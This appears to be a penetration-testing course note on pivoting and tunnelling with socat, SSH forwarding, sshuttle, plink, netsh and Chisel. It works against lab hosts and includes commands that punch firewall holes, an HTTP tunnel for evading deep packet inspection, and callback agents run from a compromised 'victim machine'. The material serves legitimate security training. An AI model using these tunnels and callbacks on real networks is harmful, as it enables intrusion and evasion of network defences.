
## 1. Port Forwarding with Linux Tools

##### SOCAT - Simple Port Forwarding
Create a simple port forwarded that will listen on a specific port on and forward traffic to another IP/Port.
Scenario:
```
socat TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
```
![[eb1577c7ae460992abbeee4839ffb4e3-PRAT2_1_3_PortForwardSocat.png]]


# 2. SSH Tunneling
#### SSH Local Port Forwarding

Forward packets from an ssh_client to a target host reachable by the ssh_server THROUGH the SSH_TUNNEL between ssh_client and ssh_server

```
ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
```

We'll pass the local port forwarding argument we just put together to **-L**, and use **-N** to prevent a shell from being opened.

The **-N** flag prevents SSH from executing any remote commands, meaning we will only receive output related to our port forward.

Scenario:
![[5cb05d0b66c698cf990c278940c231ca-PRAT2_2_1_SSHLocalPortForwardingWithCommand.png]]

#### SSH Dynamic Port Forwarding

- Enables a SOCK proxy on a specified port in the ssh_client and will redirect, *through the ssh tunnel*, all traffic to any host reachable by the ssh_server.
- Then use proxychains in Kali to reach the other networks that are reachable by the ssh_server
```
confluence@confluence01:/opt/atlassian/confluence/bin$ ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
```

Scenario:

![[e124e9fa2b3ef61f10a94d88ceeedca7-PRAT2_3_0_SSHDynamicPortForwarding.png]]

#### SSH Remote Port Forwarding
- If inbound connections are blocked by firewall, we can ssh out to a ssh_server we control in our kali machine and do a remote port forwarding instead
- Listening port will be opened in the SSH_Server and will be forwarded FROM the ssh_server TO the ssh_client, therefore we could reach any host that's reachable from the ssh_client.
- Just start a ssh server in kali and connect to it from the pivot host 
```
confluence@confluence01:/opt/atlassian/confluence/bin$ ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
```
Scenario:
![[75885fdd313005c908fae1fe43060ddc-PRAT2_4_1_SSHRemotePortForwardingWithCommand.png]]

#### SSH Remote Dynamic Port Forwarding

Open up a listening socket on the ssh_server and use the same sock proxy port to reach out the internal network that's reachable by the ssh_client.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ssh -N -R 9998 kali@192.168.118.4
```
Scenario:
![[d72023c92ecbe23dac582a4cb42c9292-PRAT2_5_0_SSHRemoteDynamicPortForwarding.png]]

#### Using sshuttle

we can run **sshuttle**, specifying the SSH connection string we want to use, as well as the subnets that we want to tunnel through this connection (**10.4.50.0/24** and **172.16.50.0/24**).

```
kali@kali:~$ sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24
[local sudo] Password: 

database_admin@192.168.50.63's password: 

c : Connected to server.
Failed to flush caches: Unit dbus-org.freedesktop.resolve1.service not found.
fw: Received non-zero return code 1 when flushing DNS resolver cache.
```

in theory, it should have set up the routing on our Kali machine so that any requests we make to hosts in the subnets we specified will be pushed transparently through the SSH connection. Let's test if this is working by trying to connect to the SMB share on HRSHARES in a new terminal.

```
kali@kali:~$ smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        scripts         Disk
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 172.16.50.217 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

kali@kali:~$
```
#### Using plink.exe on windows
```
c:\windows\system32\inetsrv>C:\Windows\Temp\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
```
This will set up a remote port forwarding from a listing port on our kali ssh_server to a the RDP port on the windows machine we ran plink from. This way we expose rdp through our outbound SSH tunnel, although direct inbound traffic to 3389 is blocked by the FW.

#### Using Netsh on Windows - Admin Privs Required!
- Set a local port forwarding rule
```
C:\Windows\system32>netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215
```
- Also, we need to allow inbound traffic on the local firewall
```
C:\Windows\system32> netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow
Ok.

C:\Windows\system32>
```
When we finish, we can delete the rules we just created:
```
C:\Users\Administrator>netsh advfirewall firewall delete rule name="port_forward_ssh_2222"

Deleted 1 rule(s).
Ok.
```
```
C:\Windows\Administrator> netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64

C:\Windows\Administrator>
```
- Confirm current rules present:
```
C:\Windows\system32>netsh interface portproxy show all
Listen on ipv4:             Connect to ipv4:

Address         Port        Address         Port
--------------- ----------  --------------- ----------
192.168.203.64  2222        10.4.203.215    22
```


#### Tunneling with Chisel through DeepPacketInspection
- Chisel will encapsulate our ssh tunnel inside a HTTP tunnel. This means ALL our traffic will be formatted as HTTP and will look like HTTP for DPI solutions.  This allows us to use the same ssh port forwarding techniques from before but, this time *through* an HTTP tunnel.

1. Start Chisel server on kali:
```
kali@kali:~$ chisel server --port 8080 --reverse
```
2. From the victim machine, connect to the chisel server and establish a remote port forwarding binding a SOCKS proxy port(1080 default) on the chisel server.
```
/tmp/chisel client 192.168.118.4:8080 R:socks > /dev/null 2>&1 &
```
3. Use the SOCKS proxy port 1080 that is listening on the loopback interface of our Kali machine to connect to the exposed targets in the internal network. 
```
Note: Previously we've created SOCKS proxy ports with both SSH remote and classic dynamic port forwarding, and used **Proxychains** to push non-SOCKS-native tools through the tunnel. But we've not yet actually run SSH itself through a SOCKS proxy.

SSH doesn't offer a generic SOCKS proxy command-line option. Instead, it offers the _ProxyCommand_[5](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/tunneling-through-deep-packet-inspection/http-tunneling-theory-and-practice/http-tunneling-with-chisel#fn5) configuration option. We can either write this into a configuration file, or pass it as part of the command line with **-o**.

ProxyCommand accepts a shell command that is used to open a proxy-enabled channel. The documentation suggests using the _OpenBSD_ version of Netcat, which exposes the _-X_ flag[5:1](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/tunneling-through-deep-packet-inspection/http-tunneling-theory-and-practice/http-tunneling-with-chisel#fn5) and can connect to a SOCKS or HTTP proxy. However, the version of Netcat that ships with Kali doesn't support proxying.

Instead, we'll use Ncat the Netcat alternative written by the maintainers of Nmap. We can install this on Kali with **sudo apt install ncat**.
```
- This will create a socks channel to port 1080 with ncat, and then tunnel the ssh traffic through the socks proxy. Which will be then forwarded as HTTP traffic by our chisel server.
```
kali@kali:~$ ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.50.215
```

## CHISEL CHEATSHEET

## **Reverse Shell Tips**
### **Run Chisel in the Background**

Running `chisel` in the foreground in a reverse shell will render your shell useless, adding these notes here as a way to work around this.

#### **Linux**

**Client Mode**

```
# Background a process with '&'
# Example commmand
chisel client 10.0.0.2:8080 R:127.0.0.1:33060:127.0.0.1:3306 R:127.0.0.1:8800:127.0.0.1:80 &
```

**Server Mode**

```
# Background a process with '&'
# Example commmand
chisel server --port 8080 --reverse &
```

#### **Windows**

##### **PowerShell**

**Client Mode**

```
# Use the Start-Job cmdlet with a script block
# Example commmand
$scriptBlock = { Start-Process C:\Windows\Temp\chisel.exe -ArgumentList @('client','10.0.0.2:8080','R:127.0.0.1:33060:127.0.0.1:3306','R:127.0.0.1:8800:127.0.0.1:80') }
Start-Job -ScriptBlock $scriptBlock
```

**Server Mode**

Note that in `server` mode, you'll need to make sure your port is allowed through the firewall.

```
# Use the Start-Job cmdlet with a script block
# Example commmand
$scriptBlock = { Start-Process C:\programdata\gbg\agent.exe -ArgumentList @('-connect 192.168.45.213:11601',' -ignore-cert')}
Start-Job -ScriptBlock $scriptBlock
```

